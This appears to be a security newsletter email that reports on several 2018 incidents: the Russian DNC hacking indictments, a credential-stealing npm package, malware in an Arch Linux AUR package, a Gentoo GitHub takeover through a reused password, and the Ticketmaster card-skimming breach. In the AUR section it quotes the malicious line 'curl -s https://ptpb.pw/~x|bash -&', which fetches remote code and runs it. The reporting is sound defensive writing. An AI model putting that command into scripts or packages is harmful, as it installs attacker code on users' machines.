---
layout: email
title: The Mueller Indictments, NPM, Arch, Gentoo, and Ticketmaster UK
---

Good morning.

A longer email today, as a final farewell before I head off on a few weeks of vacation.

My [last email](/Email-update-ASD-becomes-statutory-authority-ISM-gets-update/) contained a fairly significant typo in the third-last paragraph: 'proscriptive' vs 'prescriptive'. Hopefully most of you knew what I meant!

As a follow up to that story, [this article](https://warontherocks.com/2018/07/fish-out-of-water-how-the-military-is-an-impossible-place-for-hackers-and-what-to-do-about-it/) has been making the rounds on Twitter. It's very well put together, and covers many of the same issues ASD has with recruitment and retention of good security people.

### The Mueller Indictments

One of the major stories of the week was the [indictment of 12 members of Russian Intelligence](https://lawfareblog.com/russia-indictment-20-what-make-muellers-hacking-indictment) for the hack of the Democratic National Committee in 2016. The indictments themselves are quite interesting, and the forensic work performed by Crowdstrike (and presumably, U.S. intelligence agencies) is incredibly impressive.

Tangentially related was this [Twitter thread](https://twitter.com/pwnallthethings/status/1018164868640329728) by Matt Tait ([@pwnallthethings](https://twitter.com/pwnallthethings)):

<a href="https://twitter.com/pwnallthethings/status/1018166157206016002"><img src="https://markeldo.com/images/matt-tait-phishing.PNG" alt="Tweet by Matt Tait" class="tweet"/></a>

It's worth reading the whole thread, especially the two tweets containing screenshots of the actual phishing email sent to John Podesta, as well as the fake website set up to steal his credentials. They're quite eye-opening if you've never seen a sophisticated phishing campaign.

As Tait says, modern spear-phishing is extremely effective, and that effectiveness is simply a factor of how much effort the attacker puts into it (and making a convincing phishing email isn't technically difficult). The reality is that if you're targeted by anyone competent, they're going to get your password. 

The trick is to secure yourself in a way that you're not completely screwed the moment someone else steals one of your passwords: mitigations like unique passwords and multi-factor authentication.

### Malicious module published in NPM

It's been a crazy couple of weeks for supply-chain attacks.

We'll start with the most recent, from [Bleeping Computer](https://bleepingcomputer.com/news/security/compromised-javascript-package-caught-stealing-npm-credentials/):

>A hacker has gained access to a developer's npm account and injected malicious code into a popular JavaScript library, code that was designed to steal the npm credentials of users who utilize the poisoned package inside their projects.
>
>The JavaScript (npm) package that got compromised is called eslint-scope, a sub-module of the more famous ESLint, a JavaScript code analysis toolkit.

This is precisely the sort of attack outlined by David Gilbertson in his [Medium post](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5) back in January, which I mentioned in a [previous email](/Email-update-The-cabinet-files-and-supply-chain-attacks-at-scale/). Gilbertson's post was a bit of a wake-up-call to many web developers at the time, and it now seems prescient.

### Malicious package published in Arch User Repository

Two days before the NPM story, a very similar thing happened to Arch Linux. From [Bleeping Computer](https://bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/) again:

>Malware has been discovered in at least three Arch Linux packages available on AUR (Arch User Repository), the official Arch Linux repository of user-submitted packages. [...]
>
>The incident happened because AUR allows anyone to take over "orphaned" repositories that have been abandoned by their original authors.
>
>On Saturday, a user going by the pseudonym of "xeactor" took over one such orphaned package named "acroread" that allows Arch Linux users to view PDF files.
>
>According to a Git commit to the package's source code, xeactor added malicious code that would download a file named "~x" from ptpb.pw, a lightweight site mimicking Pastebin that allows users to share small pieces of texts.

The malicious commit is [here](https://aur.archlinux.org/cgit/aur.git/commit/?h=acroread&id=b3fec9f2f16703c2dae9e793f75ad6e0d98509bc). At the bottom of the page, you can see highlighted in green the following line:

```curl -s https://ptpb.pw/~x|bash -&```

This command downloads another set of instructions and executes them, which ends up installing a scheduled service and collecting data about each compromised system.

Fortunately, the malicious change was found and removed before more damage was done.

### Gentoo's GitHub account hacked

From [The Register](https://www.theregister.co.uk/2018/06/28/gentoo_linux_github_hacked/):

>The Linux distro's officials sounded the alarm on Thursday, revealing someone managed to break into its GitHub organization account to modify software and webpages.
>
>Basically, if you downloaded and installed materials from Gentoo via GitHub, you might be compromised by bringing in malicious code. And until the all clear is given, you should avoid fetching anything from the project's 'hub org account.

Gentoo can best be described as a niche Linux distribution: it's premise is that all applications are compiled from source locally, rather than being downloaded as pre-compiled binaries (like traditional software).

Initial predictions regarding the compromise were that a project maintainer's GitHub password had been guessed, and that they must not have had [two-factor authentication](https://help.github.com/articles/about-two-factor-authentication/) enabled. Sure enough, in the follow-up [incident report](https://wiki.gentoo.org/wiki/Project:Infrastructure/Incident_Reports/2018-06-28_Github):

>The attacker gained access to a password of an organization administrator. Evidence collected suggests a password scheme where disclosure on one site made it easy to guess passwords for unrelated webpages.

In other words, the admin had the password `"Kangaroo2017!"` on another site, and `"Kangaroo2018!"` on GitHub. Compromise of the first led to compromise of the second, and a lack of two-factor authentication meant game-over.

This sort of attack is entirely predictable, and the reason that [good password practices](https://markeldo.com/Email-update-Security-trade-offs/) recommend creating unique passwords for every website/service, storing these unique passwords in a password manager, and using two-factor authentication (2FA) wherever you can. 

This has been recommended practice for many years now, and an administrator for a major Linux distribution's GitHub project should have known better. Still, it's impossible to force people to use unique passwords, and it's becoming increasingly obvious that if you don't mandate the use 2FA, users are unlikely to enable it themselves. 

For any non-trivial systems, we as an industry need to stop relying on users being conscientious, and start making these protections mandatory.

### Ticketmaster UK supply-chain attack

Ticketmaster UK has had a bad few weeks. From [The Register](https://www.theregister.co.uk/2018/06/27/ticketmaster_support_bot_hack/):

> "On Saturday, June 23, 2018, Ticketmaster UK identified malicious software on a customer support product hosted by Inbenta Technologies, an external third-party supplier to Ticketmaster," the ticket biz said in a statement.

Inbenta is a provider of the sort of "chat bot" help systems you see on many websites these days. Ticketmaster was embedding Inbenta's code on their payments page, which meant that code had visibility of any credit card details entered by Ticketmaster's customers.

This is a classic example of where a supply-chain attack is effective. Ticketmaster had put Inbenta in a highly privileged position in their system, and the attacker, rather than attacking Ticketmaster directly, instead compromised Inbenta and leveraged this privileged access to steal credit card details.

Ticketmaster's main fault was putting Inbenta in a priviliged positon they didn't even need, increasing the risk of compromise for no tangible benefit.

From the [statement](https://www.inbenta.com/en/inbenta-and-the-ticketmaster-data-breach/) by the CEO of Inbenta, Jordi Torras:

>Upon further investigation by both parties, it has been confirmed that the source of the data breach was a single piece of JavaScript code, that was customized by Inbenta to meet Ticketmaster’s particular requirements. This code is not part of any of Inbenta’s products or present in any of our other implementations.
>
>Ticketmaster directly applied the script to its payments page, without notifying our team. Had we known that the customized script was being used this way, we would have advised against it, as it incurs greater risk for vulnerability. The attacker(s) located, modified, and used this script to extract the payment information of Ticketmaster customers processed between February and June 2018.

In short, Ticketmaster screwed up. They included Inbenta's script on a webpage it had no business being, and they're now learning a painful fact about security breaches: even if the attack vector was someone else's product, your customers will still blame you. You can outsource the work, but you can't outsource the blame.